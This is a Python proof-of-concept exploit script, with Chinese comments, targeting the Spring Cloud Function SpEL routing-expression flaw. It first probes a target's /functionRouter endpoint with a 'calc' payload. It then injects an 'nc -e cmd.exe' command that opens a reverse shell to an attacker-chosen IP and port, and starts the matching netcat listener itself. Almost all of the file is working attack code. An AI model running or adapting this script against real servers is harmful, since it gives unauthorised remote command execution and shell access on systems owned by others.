'''
Spring-Cloud-Function-SpEL poc
'''
import requests
import socket
import os

print('''



 _____            _                    _____ _                 _       ______                _   _                   _____       _____ _         ______ _____ _____
/  ___|          (_)                  /  __ \ |               | |      |  ___|              | | (_)                 /  ___|     |  ___| |        | ___ \  _  /  __ \  _
\ `--. _ __  _ __ _ _ __   __ _ ______| /  \/ | ___  _   _  __| |______| |_ _   _ _ __   ___| |_ _  ___  _ __ ______\ `--. _ __ | |__ | |  ______| |_/ / | | | /  \/ (_)
 `--. \ '_ \| '__| | '_ \ / _` |______| |   | |/ _ \| | | |/ _` |______|  _| | | | '_ \ / __| __| |/ _ \| '_ \______|`--. \ '_ \|  __|| | |______|  __/| | | | |
/\__/ / |_) | |  | | | | | (_| |      | \__/\ | (_) | |_| | (_| |      | | | |_| | | | | (__| |_| | (_) | | | |     /\__/ / |_) | |___| |____    | |   \ \_/ / \__/\  _
\____/| .__/|_|  |_|_| |_|\__, |       \____/_|\___/ \__,_|\__,_|      \_|  \__,_|_| |_|\___|\__|_|\___/|_| |_|     \____/| .__/\____/\_____/    \_|    \___/ \____/ (_)
      | |                  __/ |                                                                                          | |
      |_|                 |___/                                                                                           |_|

''')

class url_scan(object): #传入url,进行测试，
    def scan(self,url):
        url = url + "/functionRouter"
        print(f"target: {url}")
        headers = {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("calc")',
                   'Accept-Encoding': 'gzip, deflate',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Connection': 'close',
                   'Accept': '*/*',
                   'Accept-Language': 'en',
                   }
        try:
            res = requests.post(url=url, data="hack-test", headers=headers, timeout=10)
            if res.status_code == 500 and "path" in res.text:
                print(f"{url}: 存在漏洞")
                return url
            else:
                print(f"{url}: 不存在漏洞")
                exit(0)
        except Exception as e:
            print(e)
            exit(0)

class listener(object):#进行监听，并反弹nc
    def __init__(self,url):
        self.shell_url = url

    def get_ip(self):
            socket_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                socket_ip.connect(('10.255.255.255', 1))
                return socket_ip.getsockname()[0]
            except Exception:
                return '127.0.0.1'
            finally:
                socket_ip.close()

    def start_exploit(self,ip,port): #要反弹的ip,和端口

        if ip == "" or port == "":
            ip = self.get_ip()
            port = "8888"

        print(f"listen: {ip}:{port}")
        cmd = 'nc -e cmd.exe' +' ' + ip + ' ' +  port
        payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

        headers = {'spring.cloud.function.routing-expression': payload,
                   'Accept-Encoding': 'gzip, deflate',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Connection': 'close',
                   'Accept': '*/*',
                   'Accept-Language': 'en',
                   }
        try:
            res = requests.post(url=self.shell_url, data="hack-test", headers=headers, timeout=10)
            print(res.status_code)
            pass
        except Exception as e:
            print("url error")

if __name__ == '__main__':
    url = input("input Target url:")
    target = url_scan()
    Vulnerability_target = target.scan(url)

    target_listener = listener(Vulnerability_target)
    ip = input("listen ip: ")
    port = input("listen port: ")
    target_listener.start_exploit(ip, port)
    try:
        if port == "":
            os.system(f"nc -lvvp {8888}")
        else:
            os.system(f"nc -lvvp {port}")
    except Exception as e:
        print(e)
        exit(1)





